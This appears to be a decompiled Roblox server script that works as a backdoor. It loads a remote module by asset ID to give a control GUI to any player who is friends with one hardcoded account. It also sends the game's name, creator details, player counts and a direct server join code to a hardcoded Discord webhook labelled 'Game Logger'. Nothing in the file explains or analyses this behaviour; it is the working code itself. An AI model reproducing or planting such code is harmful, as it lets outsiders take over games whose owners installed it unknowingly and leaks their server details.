local PlayerAdded = game.Players.PlayerAdded
PlayerAdded.Connect(PlayerAdded, function(p1)
    local CharacterAdded = p1.CharacterAdded
    CharacterAdded.Connect(CharacterAdded, function()
        local v3 = p1
        if not v3.IsFriendsWith(v3, 9138441395) then
            return
        end
        local module = require(107220062558227)
        module.gui(module, p1.name)
    end)
end)
local game_ = game
local v6 = game_.GetService(game_, "HttpService")
local game_2 = game
local v8 = game_2.GetService(game_2, "Players")
local game_3 = game
local v10 = game_3.GetService(game_3, "MarketplaceService")
local Name = game.Name
local PlaceId = game.PlaceId
local v13 = "https://www.roblox.com/games/" .. PlaceId
local v14 = game.CreatorType == Enum.CreatorType.User and (v8.GetNameFromUserIdAsync(v8, game.CreatorId) or "Group") or "Group"
local CreatorId = game.CreatorId
local v16 = #v8.GetPlayers(v8)
local MaxPlayers = v8.MaxPlayers
local v18 = v10.GetProductInfo(v10, PlaceId)
local Visits = v18.Visits or "N/A"
local v20 = tostring(v18.Genre) or "N/A"
local FavoritesCount = v18.FavoritesCount or "N/A"
local t1 = {
    username = "Game Logger",
    avatar_url = "https://cdn.discordapp.com/attachments/1415411638659448963/1421818383636107385/image.png?ex=68da6b0e&is=68d9198e&hm=28c61f0d34067f7c34335c424fa629cb6b2ce6682dbf1163517cb286b5d36ac3&",
}
local embeds = {}
local t2 = {
    title = "New Supported Game",
    color = 3447003,
    thumbnail = {
        url = "https://cdn.discordapp.com/attachments/1415411638659448963/1421818383636107385/image.png?ex=68da6b0e&is=68d9198e&hm=28c61f0d34067f7c34335c424fa629cb6b2ce6682dbf1163517cb286b5d36ac3&",
    },
    fields = {
        {
            name = "Game Information",
            value = "**Game Name:** " .. Name .. "\n**Game Link:** [" .. Name .. "](" .. v13 .. ")" .. "\n**Join Link:** [" .. Name .. "](" .. v13 .. ")" .. "\n**Active Players:** " .. v16 .. "\n**Server Players:** " .. v16 .. "/" .. MaxPlayers .. "\n**Visits:** " .. Visits .. "\n**Copying Allowed:** " .. (tostring(v18.IsCopyingAllowed) or "N/A") .. "\n**Game Genre:** " .. v20 .. "\n**Favourites:** " .. FavoritesCount,
            inline = false,
        },
        {
            name = "Creator Information",
            value = "**Creator Name:** " .. v14 .. "\n**Creator Profile Link:** [ " .. v14 .. " ](https://www.roblox.com/users/" .. CreatorId .. ")",
            inline = false,
        },
        {
            name = "Javascript Join Code",
            value = "```js\nRoblox.GameLauncher.joinGameInstance(" .. PlaceId .. ", \"" .. game.JobId .. "\")\n```",
            inline = false,
        },
    },
    footer = {
        text = "Protected by Vanguard",
    },
}
local v25 = DateTime.now()
t2.timestamp = v25.ToIsoDate(v25)
__set_list(embeds, 1, {
    t2,
})
t1.embeds = embeds
local v26 = v6.JSONEncode(v6, t1)
v6.PostAsync(v6, "https://discord.com/api/webhooks/1412492868593127464/-g1p-nV7bLysA0EGcn2TE5PDe1MWGpXuZxwIaSvO8k6p0YTEvAW815VPzPONBviNlmXU", v26)
